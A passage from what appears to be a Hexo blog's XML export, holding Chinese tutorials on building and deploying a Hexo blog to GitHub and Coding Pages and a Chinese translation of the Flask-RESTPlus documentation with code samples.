deploy就是网站的部署的，repo就是仓库(Repository)的简写。branch选择仓库的哪个分支。而这个在后面进行双平台部署的时候会再次用到。 Front-matterFront-matter 是文件最上方以 --- 分隔的区域，用于指定个别文件的变量，举例来说： title: Hello World date: 2013/7/13 20:46:25 --- 下面这些是预先定义的参数，您可在模板中使用这些参数值并加以利用。 其中，分类和标签需要区别一下，分类具有顺序性和层次性，也就是说 Foo, Bar 不等于 Bar, Foo；而标签没有顺序和层次。 layout(布局)当你每一次使用代码:hexo new paper,它其实默认使用的是post这个布局，也就是在source文件夹下的_post里面。 Hexo 有三种默认布局：post、page 和 draft，它们分别对应不同的路径，而您自定义的其他布局和 post 相同，都将储存到 source/_posts 文件夹。 而new这个命令其实是：hexo new [layout] &lt;title&gt;,只不过这个layout默认是post罢了。 page如果你想另起一页，那么可以使用:hexo new page board 系统会自动给你在source文件夹下创建一个board文件夹，以及board文件夹中的index.md，这样你访问的board对应的链接就是https://xxx.github.io/board draftdraft是草稿的意思，也就是你如果想写文章，又不希望被看到，那么可以:hexo new draft newpage 这样会在source/_draft中新建一个newpage.md文件，如果你的草稿文件写的过程中，想要预览一下，那么可以使用:hexo server --draft,在本地端口中开启服务预览。 如果你的草稿文件写完了，想要发表到post中，hexo publish draft newpage,就会自动把newpage.md发送到post中。 主题更换主题如果觉得默认的landscape主题不好看，那么可以在官网的主题中，选择你喜欢的一个主题下载，然后进行修改就可以了。 进入到博客目录执行如下命令，含义是克隆该主题并存入到博客文件夹下的thems文件下里 git clone https://github.com/iissnan/hexo-theme-next.git themes/next 执行后就会在博客目录文件夹的themes中可以找到有next的文件。 找到博客根目录下的_config.yml文件，修改里面的配置 将theme 修改为theme: next，需要注意的是冒号后有空格 进入next这个文件夹，可以看到里面也有一个配置文件_config.yml，这个配置文件是整个主题的配置文件。 以下关于主题的配置均是按照next主题设置的。 menu(菜单栏)也即是如下图所示的这些东西： 其中，About这个你是找不到网页的，因为你的文章中没有about这个东西。 如果你想要的话，可以执行命令：hexo new page about 它就会在根目录下source文件夹中新建了一个about文件夹，以及index.md，在index.md中写上你想要写的东西，就可以在网站上展示出来了。 如果你想要自己再自定义一个菜单栏的选项，那么就：hexo new page yourdiy 然后在主题配置文件的menu菜单栏添加一个 Yourdiy : /yourdiy，注意冒号后面要有空格，以及前面的空格要和menu中默认的保持整齐。 然后在languages文件夹中，找到zh-CN.yml，在index中添加yourdiy: &apos;中文意思&apos;就可以显示中文了。 意思是说在menu中写入的是英文，但是网站使用的话会根据网站使用的语言到相应的语言包中查找到该英语的释义，然后再网站上显示出来。 比如menu菜单我写的是home，但是网站语言配置使用的是zh-Hans，此时就会到当前使用主题的语言包下找zh-Hans.yml文件，在该文件中，有一条数据 home:主页，则访问该网站时原先写的是home的地方则会显示出“主页”字样。 customize(定制)可以修改你的个人logo，在当前使用的主题文件夹下的source/css/images文件夹中放入自己要的logo，再改一下url的链接名字就可以了。 favicon是网站中出现的那个小图标的icon，找一张你喜欢的logo，然后转换成ico格式，放在images文件夹下，配置一下路径就行。 social_links ，可以显示你的社交链接，而且是有logo的。 添加RSS1. 先安装RSS插件: npm i hexo-generator-feed 2. 而后在你整个项目的_config.yml中找到Extensions，添加： # Extensions ## Plugins: https://hexo.io/plugins/ #RSS订阅 plugin: - hexo-generator-feed #Feed Atom feed: type: atom path: atom.xml limit: 20 这个时候你的RSS链接就是 域名/atom.xml了 3.在主题配置文件中设置：rss: ，开启RSS的页面功能，这样你网站上就有那个像wifi一样符号的RSS logo了，注意空格。 widgets(侧边栏)侧边栏的小标签，如果你想自己增加一个，比如我增加了一个联系方式，那么我把communication写在上面，在zh-CN.yml中的sidebar，添加communication: &apos;中文&apos;。 然后在hueman/layout/widget中添加一个communicaiton.ejs，填入模板： search(搜索框)默认搜索框是不能够用的，需要安装插件：hexo-generator-json-content comment(评论系统)valine好像不错，还能统计文章阅读量，可以自己试一试 设置头像和favicon头像/图标图片的存放位置是/themes/yilia(主题)/source/下任意位置，可以自己新建一个文件夹存放，比如img文件夹下。 打开主题相应的配置文件：/themes/yilia/_config.yml。 设置头像为配置文件中avatar一项，设置图标为配置文件中favicon一项。 设置路径的根目录为/themes/yilia/source/。例如，我的头像存放的地址是/themes/yilia/source/img/me.png，设置则为avatar: /img/me.png。（图标同理） 打赏功能打开主题相应的配置文件：/themes/yilia/_config.yml。 # 打赏 # 打赏type设定：0-关闭打赏； 1-文章对应的md文件里有reward:true属性，才有打赏； 2-所有文章均有打赏 reward_type: 2 # 打赏wording reward_wording: &apos;您的鼓励是我继续前进的动力~~~&apos; # 支付宝二维码图片地址，跟你设置头像的方式一样。比如：/assets/img/alipay.jpg alipay: /img/alipay.jpg # 微信二维码图片地址 weixin: /img/wechat.jpg git分支进行多终端工作利用git的分支系统进行多终端工作了，这样每次打开不一样的电脑，只需要进行简单的配置和在github上把文件同步下来，就可以无缝操作了。 机制由于hexo d上传部署到github的其实是hexo编译后的文件，是用来生成网页的，不包含源文件，也就是上传的是在本地目录里自动生成的.deploy_git里面。其他文件 ，包括我们写在source 里面的，和配置文件，主题文件，都没有上传到github。所以可以利用git的分支管理，将源文件上传到github的另一个分支即可。 创建分支找到之前建立的仓库，在其上新建一个hexo分支，如图： 然后在这个仓库的settings中，选择默认分支为hexo分支（这样每次同步的时候就不用指定分支，比较方便）。 然后在本地的任意目录下，打开git bash，输入如下命令：git clone git@github.com:xxx/xxx.github.io.git,xxx为用户名，也就是该仓库的git地址。 将其克隆到本地，因为默认分支已经设成了hexo，所以clone时只clone了hexo。 接下来在克隆到本地的xxx.github.io中，把除了.git 文件夹外的所有文件都删掉。把之前我们写的博客源文件全部复制过来，除了.deploy_git。 这里应该说一句，复制过来的源文件应该有一个.gitignore，用来忽略一些不需要的文件，如果没有的话，自己新建一个，在里面写上如下，表示这些类型文件不需要git： Thumbs.db db.json *.log node_modules/ public/ .deploy*/ 注意，如果你之前克隆过theme中的主题文件，那么应该把主题文件中的.git文件夹删掉，因为git不能嵌套上传，最好是显示隐藏文件，检查一下有没有，有的话就删除。 若没有.gitignore文件要如何创建? 在当前xxx.github.io文件夹里，鼠标右键选择“Git Bash Here”，打开【git bash】的界面，在命令下输入【touch .gitignore】即可创建.gitignore文件 而后添加文件到暂存区，把暂存区文件提交到仓库，同步： git add . git commit –m &quot;add branch&quot; git push 这样就上传完了，可以去你的github上看一看hexo分支有没有上传上去，其中node_modules、public、db.json已经被忽略掉了，没有关系，不需要上传的，因为在别的电脑上需要重新输入命令安装 。 最终效果是，一个仓库里，主分支是博客静态文件，hexo分支是博客源码文件 更换电脑操作- 安装Git - 设置git全局邮箱和用户名 git config --global user.name &quot;yourgithubname&quot; git config --global user.email &quot;yourgithubemail&quot; - 设置ssh key ssh-keygen -t rsa -C &quot;youremail&quot; #生成后填到github和coding上（有coding平台的话） #验证是否成功 ssh -T git@github.com - 安装nodejs yum install nodejs &amp;&amp; yum install npm - 安装hexo npm install hexo-cli -g 但是已经不需要初始化了,直接在任意文件夹下执行如下命令：git clone git@github.com:xxx/xxx.github.io.git， 然后进入克隆到的文件夹： cd xxx.github.io npm install npm install hexo-deployer-git --save 生成，部署： hexo g hexo d 然后就可以开始写你的新博客了：hexo new newpage 每次写完最好都把源文件上传一下： git add . git commit –m &quot;xxxx&quot; git push 如果是在已经编辑过的电脑上，已经有clone文件夹了，那么，每次只要和远端同步一下就行了：git pull coding page上部署实现国内外分流之前我们已经把hexo托管在github了，但是github是国外的，而且百度的爬虫是不能够爬取github的，所以如果你希望你做的博客能够在百度引擎上被收录，而且想要更快的访问，那么可以在国内的coding page做一个托管，这样在国内访问就是coding page，国外就走github page。 申请coding账户，新建项目先申请一个账户，然后创建新的项目，这一步项目名称应该是随意的。 添加ssh key这一步跟github一样。添加后，检查一下是不是添加成功 ssh -T git@git.coding.net 修改_config.ymlhexo官方文档是这样的： deploy: type: git message: [message] repo: github: &lt;repository url&gt;,[branch] coding: &lt;repository url&gt;,[branch] 那么，我们只需要： deploy: type: git repo: coding: git@git.coding.net:ZJUFangzh/ZJUFangzh.git,master github: git@github.com:ZJUFangzh/ZJUFangzh.github.io.git,master 部署保存一下，直接 hexo g hexo d 这样就可以在coding的项目上看到你部署的文件了。 开启coding pages服务，绑定域名阿里云添加解析这个时候就可以把之前github的解析改成境外，把coding的解析设为默认了。 去除coding page的跳转广告coding page的一个比较恶心人的地方就是，你只是银牌会员的话，访问会先跳转到一个广告，再到你自己的域名。那么它也给出了消除的办法。右上角切换到coding的旧版界面，默认新版是不行的。然后再来到pages服务这里。 只要你在页面上添加一行文字，写Hosted by Coding Pages，然后点下面的小勾勾，两个工作日内它就会审核通过了。 &lt;p&gt;Hosted by &lt;a href=&quot;https://pages.coding.me&quot; style=&quot;font-weight: bold&quot;&gt;Coding Pages&lt;/a&gt;&lt;/p&gt; 可以把这一行代码放在主题文件夹/layout/common/footer.ejs里面，也就是本来在页面中看到的页脚部分。当然，为了统一，又在后面加上了and Github。 最终加上去的代码： &lt;p&gt;&lt;span&gt;Hosted by &lt;a href=&quot;https://pages.coding.me&quot; style=&quot;font-weight: bold&quot;&gt;Coding Pages&lt;/a&gt;&lt;/span&gt; and &lt;span&gt;&lt;a href=&quot;https://github.com&quot; style=&quot;font-weight: bold&quot;&gt;Github&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo搭建教程(1)]]></title>
    <url>%2F2019%2F12%2F31%2FHexo%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B-1%2F</url>
    <content type="text"><![CDATA[简要说明现在市面上的博客很多，如CSDN，博客园，简书等平台，可以直接在上面发表，用户交互做的好，写的文章百度也能搜索的到。缺点是比较不自由，会受到平台的各种限制和恶心的广告。自己购买域名和服务器，搭建博客的成本实在是太高了，不光是说这些购买成本，单单是花力气去自己搭这么一个网站，还要定期的维护它，对于我们大多数人来说，实在是没有这样的精力和时间。那么就有第三种选择，直接在github page平台上托管我们的博客。这样就可以安心的来写作，又不需要定期维护，而且hexo作为一个快速简洁的博客框架，用它来搭建博客真的非常容易。Hexo是一款基于Node.js的静态博客框架，依赖少易于安装使用，可以方便的生成静态网页托管在GitHub和Coding上，是搭建博客的首选框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，并且使用json来进行数据储存，完全不需要数据库来储存数据，在几秒内，即可利用靓丽的主题生成静态网页。因为Hexo的创建者是台湾人，对中文的支持很友好，可以选择中文进行查看。教程分三个部分第一部分：hexo的初级搭建,部署到github page上，以及个人域名的绑定。第二部分：hexo的基本配置，更换主题，实现多终端工作，以及在coding page部署实现国内外分流第三部分：hexo添加各种功能教程汇总GitHub篇百度搜索github,进入官网注册。（注意：用户名跟你的博客域名有关，请慎重取名） 选择free，点击start，验证邮箱，进入注册的邮箱，打开github给我们发送的邮件，点击验证链接， 验证完成后点击start，创建仓库。仓库名必须为’用户名.github.io’ 创建好后我们来新建个文件，点击Create new file 文件为index.html，内容为&lt;h1&gt;Hello Github Pages&lt;/h1&gt; 复制你的仓库名————用户名.github.io 在浏览器中粘贴,访问,就能看到我们刚刚输入的内容 Git篇百度搜索git for windows，点击进入官网点击下载，下载好后确认安装，选择Use Windows的这个选项，我们就可以在cmd窗口中使用git命令 github SSH Key 配置 来到我们git for win的安装目录下，打开git-bash，输入ssh-keygen -t rsa -C “github的注册邮箱地址”，一路回车生成密钥，默认生成在C:\Users\用户名.ssh目录下面。 接下来来到github官网，点击头像选择setting 再点击SSH and GPG keys，选择右边的New SSH key 标题可以自定义，找到我们生成的密钥(id_rsa.pub)，默认生成在C:\Users\用户名.ssh目录下面，拷贝到Key下，然后保存。 Hexo篇先在本地新建个blog文件夹(随意)，在cmd命令行进入到blog文件夹下。（win+R打开运行对话框，输入cmd打开命令行程序）, 在打开的命令行中输入如下命令：npm install hexo-cli -g，回车确认命令，安装。 安装成功后，j接着在命令行中输入并运行初始化命令：hexo init blog 初始化好后，进入文件夹，输入命令安装依： npm install 若网络较差，可以使用淘宝镜像： 命令:npm install -g cnpm –registry=https://registry.npm.taobao.org 使用就是把npm改成cnpm即可。 安装完成后，输入hexo s -p 5555(在指定端口5555启动服务) 在网页上输入localhost:5555预览一下（localhost表示本地访问） 打开_config.yml文件，需要修改的地方有：title(网站名)，author(作者)，description(介绍)，url(即是“https://用户名.github.io)。 使用Ctrl+S保存文件. 现在我们打开github获取仓库地址,点击头像-&gt;Your profile,点击对应的仓库,点击Clone or download， 复制仓库地址,在_config.yml的最后找到deploy，输入如下内容（注意要有空格和缩进，不然会报错） deploy: type:git repository: git@github.com:用户名/用户名.github.io.git branch: master 接下来还需要安装git插件，命令: npm install hexo-deployer-git –save 安装好后输入hexo g，生成静态文件命令 再输入命令:hexo d,部署到github 第一提交会提示您配置github的邮箱和用户名,在弹出的输入框中输入用户名，密码登录. 显示出INFO Deploy done: git表示成功发布到github上 在浏览器上输入 “用户名.github.io” 即可访问自己的博客 主题篇在hexo官网的Themes下，搜索next，搜索结果点击跳转到github仓库，点击CN查看中文介绍，点击详细安装步骤，下载稳定版本(git clone),拷贝到博客目录的themes下. git clone https://github.com/iissnan/hexo-theme-next.git themes/next 或者下载下来主题压缩包文件，解压后修改文件名称放到themes文件夹下 打开_config.yml，修改 theme: next。 注意是博客目录下的_config.yml，不是主题目录下的 hexo g 重新生成一下 hexo s -p 5555本地端口部署 打开浏览器输入：localhost:5555，预览一下主题效果 ​]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Flask-RESTPlus官方文档翻译]]></title>
    <url>%2F2019%2F12%2F31%2FFlask-RESTPlus%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91%2F</url>
    <content type="text"><![CDATA[欢迎文档Flask-RESTPlus 是对 Flask 的扩展，它增加了对快速开发 REST API 的支持。Flask-RESTPlus 鼓励以最小的设置来实现功能的开发。如果你熟悉 Flask，那么会很容易就能上手 Flask-RESTPlus。Flask-RESTPlus 中提供了大量的装饰器和工具来描述你的 API，并以文档化的形式将这些接口展现出来(通过Swagger来实现)。1. 版本兼容性支持 2.7+以上版本的python2. 安装1. 使用pip方式进行安装1$ pip install flask-restplus2. 使用easy_install方式进行安装1$ easy_install flask-restplus3. 教程文档3.1 安装使用pip方式进行安装1pip install flask-restplus开发版本可以通过GitHub的方式进行下载安装123git clone https://github.com/noirbizarre/flask-restplus.gitcd flask-restpluspip install -e .[dev,test]Flask-RESTPlus支持Python版本是2.7，3.3，3.4，3.5.同样也支持 PyPy and PyPy3.3.2 快速开始前提条件:了解Flask，已经安装好Flask和Flask-RESTPlus。3.2.1 初始化12345from flask import Flaskfrom flask_restplus import Apiapp = Flask(__name__)api = Api(app)或者使用工厂模式进行初始化：123456from flask import Flaskfrom flask_restplus import Apiapi = Api()app = Flask(__name__)api.init_app(app)3.2.2 最简单的API12345678910111213from flask import Flaskfrom flask_restplus import Resource, Apiapp = Flask(__name__)api = Api(app)@api.route('/hello')class HelloWorld(Resource): def get(self): return &#123;'hello': 'world'&#125;if __name__ == '__main__': app.run(debug=True)保存该文件为api.py.使用python解释器运行该文件，并且开启debug模式方便调试。123$ python api.py* Running on http://127.0.0.1:5000/* Restarting with reloader警告:不要在生产环境开启debug模式使用curl命令访问该接口:12$ curl http://127.0.0.1:5000/hello&#123;"hello": "world"&#125;或者使用浏览器,输入地址:http://127.0.0.1:5000/hello进行访问3.2.3 资源路由12345678910111213141516171819from flask import Flask, requestfrom flask_restplus import Resource, Apiapp = Flask(__name__)api = Api(app)todos = &#123;&#125;@api.route('/&lt;string:todo_id&gt;')class TodoSimple(Resource): def get(self, todo_id): return &#123;todo_id: todos[todo_id]&#125; def put(self, todo_id): todos[todo_id] = request.form['data'] return &#123;todo_id: todos[todo_id]&#125;if __name__ == '__main__': app.run(debug=True)使用curl命令访问:12345678$ curl http://localhost:5000/todo1 -d "data=Remember the milk" -X PUT&#123;"todo1": "Remember the milk"&#125;$ curl http://localhost:5000/todo1&#123;"todo1": "Remember the milk"&#125;$ curl http://localhost:5000/todo2 -d "data=Change my brakepads" -X PUT&#123;"todo2": "Change my brakepads"&#125;$ curl http://localhost:5000/todo2&#123;"todo2": "Change my brakepads"&#125;或者使用python的Requests模块进行访问123456789&gt;&gt;&gt; from requests import put, get&gt;&gt;&gt; put('http://localhost:5000/todo1', data=&#123;'data': 'Remember the milk'&#125;).json()&#123;u'todo1': u'Remember the milk'&#125;&gt;&gt;&gt; get('http://localhost:5000/todo1').json()&#123;u'todo1': u'Remember the milk'&#125;&gt;&gt;&gt; put('http://localhost:5000/todo2', data=&#123;'data': 'Change my brakepads'&#125;).json()&#123;u'todo2': u'Change my brakepads'&#125;&gt;&gt;&gt; get('http://localhost:5000/todo2').json()&#123;u'todo2': u'Change my brakepads'&#125;Flask-RESTPlus返回任何可迭代的类型，它会将该返回值转换成响应对象（response），包括原始的 Flask 响应对象。Flask-RESTPlus 还提供了设置响应码和响应头的功能.1234567891011121314class Todo1(Resource): def get(self): # Default to 200 OK return &#123;'task': 'Hello world'&#125;class Todo2(Resource): def get(self): # Set the response code to 201 return &#123;'task': 'Hello world'&#125;, 201class Todo3(Resource): def get(self): # Set the response code to 201 and return custom headers return &#123;'task': 'Hello world'&#125;, 201, &#123;'Etag': 'some-opaque-string'&#125;3.2.4 端点可以向 Api 对象的add_resource()方法或 route()装饰器中传入多个 URL，这样每个 URL 都将会路由到该资源上：12345api.add_resource(HelloWorld, '/hello', '/world') # HelloWorld为下方的class类名# 或者下面装饰器方式，二者等价@api.route('/hello', '/world')class HelloWorld(Resource): pass也可以将 URL 中的部分内容设置成变量，以此来匹配资源方法12345api.add_resource(HelloWorld, '/todo/&lt;int:todo_id&gt;', endpoint='todo_ep')# 或者下面装饰器方式，二者等价@api.route('/todo/&lt;int:todo_id&gt;', endpoint='todo_ep')class HelloWorld(Resource): pass注意:如果一个请求（request）与应用的任何端点都不匹配，那么 Flask-RESTPlus 将会返回一个 404 错误信息，并给出其他与所请求端点最匹配的建议信息。不过，我们可以通过在程序配置中设置 ERROR_404_HELP 为 False 来关闭该功能。1app.config['ERROR_404_HELP'] = False3.2.5 参数解析Flask-RESTPlus 内置支持对请求数据的验证，这一功能是通过使用一个类似于 argparse 的库来实现的123456from flask_restplus import reqparseparser = reqparse.RequestParser()parser.add_argument('rate', type=int, help='Rate to charge for this resource')args = parser.parse_args() # 放到需要验证用户提交的数据的函数方法中注意：parse_args()返回的是一个 Python 字典，而不是自定义数据结构。使用 RequestParser 类还能获取完整的错误信息。如果一个参数未验证通过，Flask-RESTPlus 将响应一个 400 错误请求，以及一个高亮错误信息的响应。示例程序如下：12345678910111213141516171819202122232425262728293031#!/usr/bin/env python# -*- coding: utf-8 -*-from flask import Flask, requestfrom flask_restplus import Api, Resource, reqparse, fieldsapp = Flask(__name__)# app.config['ERROR_404_HELP'] = Falseapi = Api(app)parser = reqparse.RequestParser()parser.add_argument('rate', type=int, required=True,help='Rate to charge for this resource')# parser.add_argument('data', required=True,help='data to charge for this resource')todos = &#123; '1':'eat', '2':'sleep'&#125;@api.route('/&lt;string:todo_id&gt;')class TodoSimple(Resource): def get(self, todo_id): return &#123;todo_id: todos[todo_id]&#125; def put(self, todo_id): args = parser.parse_args() # print(args) todos[todo_id] = request.form['data'] return &#123;todo_id: todos[todo_id]&#125; # return args其中，parser.add_argument(‘rate’, type=int,required=True,help=’Rate to charge for this resource’)表示，参数名为 rate，数据类型为 int，请求时必须发送此参数，如果验证不通过时将会返回 help 指定的信息。运行程序并使用 curl 进行访问，几种情况的验证结果如下： 提供 rate 值，但不是 int 型（验证不通过） 提供 rate 值，且是 int 型（验证通过） 不提供 rate 值（验证不通过）注:使用curl访问的时候,除了需要传递data参数值外,还需要传递rate参数值才行.当然data参数值也可以进行验证.参数 strict=True 的含义:若传递了未定义的参数则报错.1args = parser.parse_args(strict=True)3.2.6 数据格式化默认情况下，在返回的可迭代对象中的所有字段都会原样返回,但是当涉及到对象时将会变得非常棘手.Flask-RESTPlus 提供了 fields 模块和marshal_with()装饰器来解决返回的是对象的问题.123456789101112131415161718192021222324252627from collections import OrderedDictfrom flask import Flaskfrom flask_restplus import fields, Api, Resourceapp = Flask(__name__)api = Api(app)# 格式化返回的是对象的值.也就是说返回的是对象中的如下格式化的值model = api.model('Model', &#123; 'task': fields.String, 'uri': fields.Url('todo_ep',absolute=True) # absolute表示返回绝对路径&#125;)class TodoDao(object): def __init__(self, todo_id, task): self.todo_id = todo_id self.task = task # This field will not be sent in the response self.status = 'active'@api.route('/todo',endpoint='todo_ep') # 不指定端点默认是视图函数名class Todo(Resource): @api.marshal_with(model) # 返回对象格式化引用的装饰器 def get(self, **kwargs): return TodoDao(todo_id='my_todo', task='Remember the milk') # 返回的是一个对象此功能的作用如下:若返回的是一个对象,可以通话该装饰器,格式化该对象要返回的数据,数据表查询比较常用顺序保留默认情况下，字段顺序并未得到保留，因为它会损耗性能。不过，如果你确实需要保留字段顺序，那么可以向类或函数传入一个 ordered=True 的参数项，以此强制进行顺序保留： Api 全局保留：api = Api(ordered = True) Namespace 全局保留：ns = Namespace(ordered=True) marshal()局部保留：return marshal(data, fields, ordered=True)marshal()局部保留的例子如下:12345678910111213141516171819202122232425262728from collections import OrderedDictfrom flask import Flaskfrom flask_restplus import fields, Api, Resourceapp = Flask(__name__)api = Api(app)# 格式化返回的是对象的值.也就是说返回的是对象中的如下格式化的值model = api.model('Model', &#123; 'task': fields.String, 'uri': fields.Url('todo_ep',absolute=True) # absolute表示返回绝对路径&#125;)class TodoDao(object): def __init__(self, todo_id, task): self.todo_id = todo_id self.task = task # This field will not be sent in the response self.status = 'active'@api.route('/todo',endpoint='todo_ep') # 不指定端点默认是视图函数名class Todo(Resource): @api.marshal_with(model) # 返回对象格式化引用的装饰器 def get(self, **kwargs): # return TodoDao(todo_id='my_todo', task='Remember the milk') # 返回的是一个对象 return api.marshal(TodoDao(todo_id='my_todo', task='Remember the milk'), model, ordered=True)3.2.7 完整例子123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#!/usr/bin/env python# -*- coding: utf-8 -*-from flask import Flaskfrom flask_restplus import Api, Resource, fieldsfrom werkzeug.contrib.fixers import ProxyFixapp = Flask(__name__)app.wsgi_app = ProxyFix(app.wsgi_app)api = Api(app, version='1.0', title='TodoMVC API', description='A simple TodoMVC API', )ns = api.namespace('todos', description='TODO operations')todo = api.model('Todo', &#123; 'id': fields.Integer(readOnly=True, description='The task unique identifier'), 'task': fields.String(required=True, description='The task details')&#125;)class TodoDAO(object): def __init__(self): self.counter = 0 self.todos = [] def get(self, id): for todo in self.todos: if todo['id'] == id: return todo api.abort(404, "Todo &#123;&#125; doesn't exist".format(id)) def create(self, data): todo = data todo['id'] = self.counter = self.counter + 1 self.todos.append(todo) return todo def update(self, id, data): todo = self.get(id) todo.update(data) return todo def delete(self, id): todo = self.get(id) self.todos.remove(todo)DAO = TodoDAO()DAO.create(&#123;'task': 'Build an API'&#125;)DAO.create(&#123;'task': '?????'&#125;)DAO.create(&#123;'task': 'profit!'&#125;)@ns.route('/')class TodoList(Resource): '''Shows a list of all todos, and lets you POST to add new tasks''' @ns.doc('list_todos') @ns.marshal_list_with(todo) def get(self): '''List all tasks''' return DAO.todos @ns.doc('create_todo') @ns.expect(todo) @ns.marshal_with(todo, code=201) def post(self): '''Create a new task''' return DAO.create(api.payload), 201@ns.route('/&lt;int:id&gt;')@ns.response(404, 'Todo not found')@ns.param('id', 'The task identifier')class Todo(Resource): '''Show a single todo item and lets you delete them''' @ns.doc('get_todo') @ns.marshal_with(todo) def get(self, id): '''Fetch a given resource''' return DAO.get(id) @ns.doc('delete_todo') @ns.response(204, 'Todo deleted') def delete(self, id): '''Delete a task given its identifier''' DAO.delete(id) return '', 204 @ns.expect(todo) @ns.marshal_with(todo) def put(self, id): '''Update a task given its identifier''' return DAO.update(id, api.payload)if __name__ == '__main__': app.run(port=8000,debug=True)4.响应编组4.1 基本使用12345678910111213from flask_restplus import Resource, fieldsmodel = api.model('Model', &#123; 'name': fields.String, 'address': fields.String, 'date_updated': fields.DateTime(dt_format='rfc822'), # 对返回响应的数据做进一步的处理&#125;)@api.route('/todo')class Todo(Resource): @api.marshal_with(model, envelope='resource') # envelope的作用是做返回值字典的键 def get(self, **kwargs): return db_get_todo() # Some function that queries the db下方结果对上述代码稍作修改,主要是为了体现@api.marshal_with(model, envelope=’resource’)中envelope的作用12345678C:\Users\Administrator&gt;curl http://127.0.0.1:5000/todo&#123; "resource": &#123; "name": "sandu", "priority": "Normal", "status": "Read" &#125;&#125;注:@api.marshal_with()装饰器的作用等价于如下:1returtn api.marshal(被装饰对象,model,envelope='resource'),2004.2 重命名属性该功能主要作用是同一个变量,在代码内部使用一个同一个变量名,提供给用户时显示的是另一个变量名1234model = &#123; 'name': fields.String(attribute='private_name'), 'address': fields.String,&#125;完整示例如下:1234567891011121314151617181920212223242526272829303132333435363738394041424344from flask import Flask, requestfrom flask_restplus import Api, Resource, reqparse, fieldsapp = Flask(__name__)# app.config['ERROR_404_HELP'] = Falseapi = Api(app)class TodoDao(object): def __init__(self, private_name, address,flags): self.private_name = private_name self.address = address self.flags = flags # This field will not be sent in the response self.priority = None self.status = Noneclass UrgentItem(fields.Raw): def format(self, value): return "Urgent" if value == 1 else "Normal"class UnreadItem(fields.Raw): def format(self, value): return "Unread" if value ==2 else "Read"model = &#123; 'name': fields.String(attribute='private_name'), 'priority': UrgentItem(attribute='flags'), 'status': UnreadItem(attribute='flags'), 'age':fields.Integer(default=20)&#125;@api.route('/todo')class Todo(Resource): # @api.marshal_with(model, envelope='resource') def get(self, **kwargs): return api.marshal(TodoDao(private_name='sandu', address='beijing',flags=1), model, envelope='resource') # Some function that queries the dbif __name__ == '__main__': app.run(debug=True)注意看上述代码的示例:代码中使用的变量名是private_name,返回给用户的结果中显示的变量名是name,具体如下:123456789C:\Users\Administrator&gt;curl http://127.0.0.1:5000/todo&#123; "resource": &#123; "name": "sandu", "priority": "Urgent", "status": "Read", "age": 20 &#125;&#125;也可以指定为 lambda 表达式或者其他可调用的语句1234model = &#123; 'name': fields.String(attribute=lambda x: x._private_name), 'address': fields.String,&#125;还可以利用 attribute 来访问嵌套的属性1234model = &#123; 'name': fields.String(attribute='people_list.0.person_dictionary.name'), 'address': fields.String,&#125;4.3 默认值为对象中不存在但是返回值存在的指定默认值,重命名例子中的age就是,如下所示:123456model = &#123; 'name': fields.String(attribute='private_name'), 'priority': UrgentItem(attribute='flags'), 'status': UnreadItem(attribute='flags'), 'age':fields.Integer(default=20)&#125;4.4 自定义字段及多值情况该功能通俗点来说是根据值得不同返回对应的不同的结果如上述的部分代码:1234567891011121314151617181920212223class UrgentItem(fields.Raw): def format(self, value): return "Urgent" if value == 1 else "Normal"class UnreadItem(fields.Raw): def format(self, value): return "Unread" if value ==2 else "Read"model = &#123; 'name': fields.String(attribute='private_name'), 'priority': UrgentItem(attribute='flags'), 'status': UnreadItem(attribute='flags'), 'age':fields.Integer(default=20)&#125;@api.route('/todo')class Todo(Resource): # @api.marshal_with(model, envelope='resource') def get(self, **kwargs): return api.marshal(TodoDao(private_name='sandu', address='beijing',flags=1), model, envelope='resource') # Some function that queries the db当返回的TodoDao对象中,flags的值不同,返回的参数priority和status值也会根据上述两个class的返回结果而不同.当flags=1时,返回的结果是:123456789C:\Users\Administrator&gt;curl http://127.0.0.1:5000/todo&#123; "resource": &#123; "name": "sandu", "priority": "Urgent", "status": "Read", "age": 20 &#125;&#125;当flags=2时,返回的结果是:123456789C:\Users\Administrator&gt;curl http://127.0.0.1:5000/todo&#123; "resource": &#123; "name": "sandu", "priority": "Normal", "status": "Unread", "age": 20 &#125;&#125;4.5 URL和其他字段该返回对象值增加额外的字段123456789101112class RandomNumber(fields.Raw): def output(self,key,obj,ordered=None): return random.random()model = &#123; 'name': fields.String(attribute='private_name'), 'priority': UrgentItem(attribute='flags'), 'status': UnreadItem(attribute='flags'), 'age': fields.Integer(default=20), 'random': RandomNumber(),&#125;注意:以上代码经过修改,跟官网文档不一样,主要是output()中多了一个ordered=None,不然不加这个会报错:TypeError: output() got an unexpected keyword argument ‘ordered’可以把def output(self,key,obj,ordered=None)看成是一个固定写法,只修改其返回值即可.返回结果是:12345678910C:\Users\Administrator&gt;curl http://127.0.0.1:5000/todo&#123; "resource": &#123; "name": "sandu", "priority": "Normal", "status": "Unread", "age": 20, "random": 0.12434240543068387 &#125;&#125;默认情况下，fields.Url 返回的是一个相对于根路径的相对 URI,不过也可以返回绝对路径,以及地址的schema(协议)等.1234model = &#123; 'uri': fields.Url('todo_resource', absolute=True) 'https_uri': fields.Url('todo_resource', absolute=True, scheme='https')&#125;4.6 复杂结构提供一个扁平的结构，而 marshal()则会按照定义的规则将其转换成一个嵌套结构12345678910111213&gt;&gt;&gt; from flask_restplus import fields, marshal&gt;&gt;&gt; import json&gt;&gt;&gt;&gt;&gt;&gt; resource_fields = &#123;'name': fields.String&#125;&gt;&gt;&gt; resource_fields['address'] = &#123;&#125;&gt;&gt;&gt; resource_fields['address']['line 1'] = fields.String(attribute='addr1')&gt;&gt;&gt; resource_fields['address']['line 2'] = fields.String(attribute='addr2')&gt;&gt;&gt; resource_fields['address']['city'] = fields.String&gt;&gt;&gt; resource_fields['address']['state'] = fields.String&gt;&gt;&gt; resource_fields['address']['zip'] = fields.String&gt;&gt;&gt; data = &#123;'name': 'bob', 'addr1': '123 fake street', 'addr2': '', 'city': 'New York', 